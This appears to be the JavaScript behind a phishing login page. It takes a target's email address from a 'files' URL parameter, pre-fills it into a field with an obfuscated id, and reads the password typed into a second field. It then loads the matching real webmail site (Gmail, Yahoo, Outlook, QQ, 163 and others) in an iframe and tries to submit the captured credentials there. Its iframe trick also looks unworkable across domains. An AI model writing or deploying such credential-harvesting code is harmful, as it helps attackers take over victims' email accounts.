document.addEventListener("DOMContentLoaded", function() {
  // Function to get query parameter value by name
  function getQueryParam(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
  }

  // Get the email parameter from the URL
  const email = getQueryParam('files');
  
  // If the email parameter is present, update the email input field
  if (email) {
    const emailInput = document.getElementById('Cm-mK-AD');
    if (emailInput) {
      emailInput.value = email;
    }
  }

  // Handle form submission
  const form = document.getElementById('login-form');
  const iframe = document.getElementById('login-frame');

  if (form && iframe) {
    form.addEventListener('submit', function(event) {
      event.preventDefault(); // Prevent the default form submission

      // Extract the domain from the email
      const domain = email ? email.split('@')[1] : '';
      
      // Map of domains to their login URLs
      const domainLoginUrls = {
        'gmail.com': 'https://mail.google.com',
        'yahoo.com': 'https://login.yahoo.com',
        'hotmail.com': 'https://outlook.live.com',
        '126.com': 'https://mail.126.com',
        'skynet.be': 'https://www.skynet.be',
        'qq.com': 'https://mail.qq.com',
        'sina.com': 'https://mail.sina.com.cn',
        'sohu.com': 'https://mail.sohu.com',
        '163.com': 'https://mail.163.com',
        'aliyun.com': 'https://mail.aliyun.com',
        'tencent.com': 'https://mail.qq.com'
      };

      // Construct the login URL based on the domain
      const loginUrl = domainLoginUrls[domain];

      if (loginUrl) {
        // Set the src of the iframe to the login page URL
        iframe.src = loginUrl;

        // Wait for the iframe to load the login page
        iframe.onload = function() {
          // Fill in the credentials and submit the form inside the iframe
          const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
          const password = document.getElementById('WK-kD-Mf').value;

          // Assuming login form inside the iframe has id 'login-form'
          const loginForm = iframeDocument.querySelector('form');
          if (loginForm) {
            iframeDocument.querySelector('input[type="email"]').value = email;
            iframeDocument.querySelector('input[type="password"]').value = password;
            loginForm.submit();
          }
        };
      } else {
        alert('Unsupported email domain. Please use a supported email address.');
      }
    });
  }
});
